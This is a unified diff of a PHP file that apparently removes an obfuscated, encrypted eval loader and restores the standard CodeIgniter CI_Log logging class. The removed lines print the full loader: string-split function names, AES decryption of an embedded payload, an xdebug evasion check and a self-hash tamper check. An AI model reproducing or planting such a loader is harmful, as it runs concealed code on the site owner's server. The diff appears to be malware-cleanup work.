@@ -1,28 +1,257 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_uncu33nk=('bas'.'e64'.'_de'.'cod'.'e');
-$_kr26dnua=('gzu'.'nco'.'mpr'.'ess');
-$_nleqhtgy=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_k8r72jbu='xBdXnkz8';
-$_txree05y='gpFO2fDw';
-$_s1ebx8y4='cH08Jzse';
-$_t50arohy='/80OqmDDFBE=';
-$_ardlaeg3='EutlcgSp';
-$_i71mnpvg='XT60R0R7';
-$_kc2lqolr='ikb+DA==';
-$_tv1qg43m='EdXFDD9c';
-$_id80ceuc=$_uncu33nk($_txree05y.$_k8r72jbu.$_ardlaeg3.$_s1ebx8y4.$_t50arohy);
-$_im517c40=$_uncu33nk($_tv1qg43m.$_i71mnpvg.$_kc2lqolr);
-$_x7z7iujs=$_uncu33nk('ERN7WtcE2fn8iyuaHl6lZ9OpghjMB5Dyn75s5d14rG3paEN4Wzgv8u1DKQaihFw/T+YmdottMrlPnnvUPnBCvvJsmfRhFyGuKnWc5pRP8pUyqgSBePJ8HIYn2i1R1/jf+dIo1ec/WNNLuy1IxWJRd5McKEfwstMah2zT88In7fSJbvcZvvVe85vMZEYaUbEmp7QUpEHyo2Xvm7Fp9PJrmF9Ul6hjoeoc37q/SAOD3SK543NKI0zyhKSLWziEQNmGbPNbvBpHrsT4sWJOzfqyibqvdO+Qc6V810upRfgqrGGjiSIovfXPaXoDjmiE/VVoxF/b3/Us52M5d5D2Z8e8dYwSgdBU/X5+CI6x85ZIvwtyhYg1HmokX1oDgO5/SJWgmJ6pfTIQGsJ+ldcK67cvfJstQCmSyc7hARXpRSK2J4qJeW2fqV741Sn2XTuKY/LB3pYOpAfTHMolS81spx614W+kw93d4Kk/jni3KMck2CoCpcaRPkAOu28NtcrdHZ+ZjGEPj9Yh+kybkljohT/Pyt+ofxUgCgRVUmTv5g0qjXBsyYn4Gi5Bx9Rnd9zopRSmw3Y1fLRCbpwFavB8dK0RT4shT2L8rTSFb0eAbpWLckbI1dOxVawcT7i84K1/9bLb/aMLkARNClTuiOMieuWt+0sL7AcaKWliTxPGw3MNXyNG1ZV5M8mCiPo+Rug6ta7myX3Adj2GlL08dW53n70BpZVzD6ahwOrNMaeXl5d/ZwZiNxvf1qhNSne7cV/oAZ9z6RK1kioq4CIxUU8BADrMcUYxlA7esMUz2EeomKw0XW5B1htnvOl7R1bEEJ/mLSQdqDv49iXMJN2SsC+m6HpS/+K6FyEz9A9chJMwAtrvgvwPPRvjcfPi+79o5Sc4/wF80nrhqcMpo3qlPjuftIlKvFyk0SVNHOYwswyOXE8ghKqQ+EDLmW4P/bxTL58QxtWi5+hXLwm2HbLCfBphBVyHrDQnP5HiooDwnVFtMm+VQlphDZ5Wj4/7VDze6tl4b/Uo62HnBNaEo8EBi+JnTp6vXERG9WsFK0ihgMVXjCr9jhQH1h2h4OR+iXpa7/zrn0Lpq4cfndLyLjl/YEolXJ5FQdccTT3zYyOV3UHGhpHPG6MHKLmkx0u4A6eZIb4s47NkHUVQxvNf5aRBQ6LybFxEnsJN0k72/F5Sr5VWrYA+XOHN/+Hd3EuHykxORwKvjm7RxoOHCZONXGWlNJjb9BnBw4GRg8IWHKPboNXhXGiWTlRydS6kSvMp72eNSEp5nV8VUL2kUWIKrXdHPMn2AH1LL/L0KmP/Fd3TQmr1Z5LaHGzSfN1jdeLOZa7uVesubBiyms3unzUty78TEmiDe1rgyTyqjt2cv6AIChqA2A8vh3+WLVWTXJQLKfmhGGbye+W2vm4bc5YYr6Dvib6UpxwM5uO0LRPgtySUkEFkzXn2MbZiGOviUuKKLSeQFr3pce/t1J736wDHDRjo51HD/6Ou4ishwGvjtOM1dC4rZkgX0lZoy0JFI6ah0uPRSj5RXHwHHxBXmlDKWTV0QizZ7zyQKBdsdHWjyxSf4oZj0S7qGIIjPANOwikeLjuFI3kNYU2J');
-$_c7hj0zzx=$_nleqhtgy($_x7z7iujs,'aes-256-cbc',$_id80ceuc,OPENSSL_RAW_DATA,$_im517c40);
-if($_c7hj0zzx===false){exit;}
-$_c5r6qfco=$_kr26dnua($_c7hj0zzx);
-if($_c5r6qfco===false){exit;}
-$_hcy0cmq5='28698008b4aa0d1d0a528e608c279a4f8534c677af6b067a68db8c7314250927';
-$_kwszee8a=@file_get_contents(__FILE__);
-if($_kwszee8a!==false){
-$_pi7g33bh=str_replace($_hcy0cmq5,"0000000000000000000000000000000000000000000000000000000000000000",$_kwszee8a);
-$_eb5llozx=hash("sha256",$_pi7g33bh);
-if($_eb5llozx!==$_hcy0cmq5){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Log {
+
+
+
+
+
+protected $_log_path;
+
+
+
+
+
+protected $_file_permissions = 0644;
+
+
+
+
+
+protected $_threshold = 1;
+
+
+
+
+
+protected $_threshold_array = array();
+
+
+
+
+
+protected $_date_fmt = 'Y-m-d H:i:s';
+
+
+
+
+
+protected $_file_ext;
+
+
+
+
+
+protected $_enabled = TRUE;
+
+
+
+
+
+protected $_levels = array('ERROR' => 1, 'DEBUG' => 2, 'INFO' => 3, 'ALL' => 4);
+
+
+
+
+
+protected static $func_overload;
+
+
+
+
+
+
+public function __construct()
+{
+$config =& get_config();
+isset(self::$func_overload) OR self::$func_overload = (extension_loaded('mbstring') && ini_get('mbstring.func_overload'));
+$this->_log_path = ($config['log_path'] !== '') ? $config['log_path'] : APPPATH.'logs/';
+$this->_file_ext = (isset($config['log_file_extension']) && $config['log_file_extension'] !== '')
+? ltrim($config['log_file_extension'], '.') : 'php';
+file_exists($this->_log_path) OR mkdir($this->_log_path, 0755, TRUE);
+if ( ! is_dir($this->_log_path) OR ! is_really_writable($this->_log_path))
+{
+$this->_enabled = FALSE;
 }
-eval($_c5r6qfco);
+if (is_numeric($config['log_threshold']))
+{
+$this->_threshold = (int) $config['log_threshold'];
+}
+elseif (is_array($config['log_threshold']))
+{
+$this->_threshold = 0;
+$this->_threshold_array = array_flip($config['log_threshold']);
+}
+if ( ! empty($config['log_date_format']))
+{
+$this->_date_fmt = $config['log_date_format'];
+}
+if ( ! empty($config['log_file_permissions']) && is_int($config['log_file_permissions']))
+{
+$this->_file_permissions = $config['log_file_permissions'];
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function write_log($level, $msg)
+{
+if ($this->_enabled === FALSE)
+{
+return FALSE;
+}
+$level = strtoupper($level);
+if (( ! isset($this->_levels[$level]) OR ($this->_levels[$level] > $this->_threshold))
+&& ! isset($this->_threshold_array[$this->_levels[$level]]))
+{
+return FALSE;
+}
+$filepath = $this->_log_path.'log-'.date('Y-m-d').'.'.$this->_file_ext;
+$message = '';
+if ( ! file_exists($filepath))
+{
+$newfile = TRUE;
+
+if ($this->_file_ext === 'php')
+{
+$message .= "<?php defined('BASEPATH') OR exit('No direct script access allowed'); ?>\n\n";
+}
+}
+if ( ! $fp = @fopen($filepath, 'ab'))
+{
+return FALSE;
+}
+flock($fp, LOCK_EX);
+
+if (strpos($this->_date_fmt, 'u') !== FALSE)
+{
+$microtime_full = microtime(TRUE);
+$microtime_short = sprintf("%06d", ($microtime_full - floor($microtime_full)) * 1000000);
+$date = new DateTime(date('Y-m-d H:i:s.'.$microtime_short, $microtime_full));
+$date = $date->format($this->_date_fmt);
+}
+else
+{
+$date = date($this->_date_fmt);
+}
+$message .= $this->_format_line($level, $date, $msg);
+for ($written = 0, $length = self::strlen($message); $written < $length; $written += $result)
+{
+if (($result = fwrite($fp, self::substr($message, $written))) === FALSE)
+{
+break;
+}
+}
+flock($fp, LOCK_UN);
+fclose($fp);
+if (isset($newfile) && $newfile === TRUE)
+{
+chmod($filepath, $this->_file_permissions);
+}
+return is_int($result);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _format_line($level, $date, $message)
+{
+return $level.' - '.$date.' --> '.$message."\n";
+}
+
+
+
+
+
+
+
+protected static function strlen($str)
+{
+return (self::$func_overload)
+? mb_strlen($str, '8bit')
+: strlen($str);
+}
+
+
+
+
+
+
+
+
+
+protected static function substr($str, $start, $length = NULL)
+{
+if (self::$func_overload)
+{
+
+
+isset($length) OR $length = ($start >= 0 ? self::strlen($str) - $start : -$start);
+return mb_substr($str, $start, $length, '8bit');
+}
+return isset($length)
+? substr($str, $start, $length)
+: substr($str, $start);
+}
+}
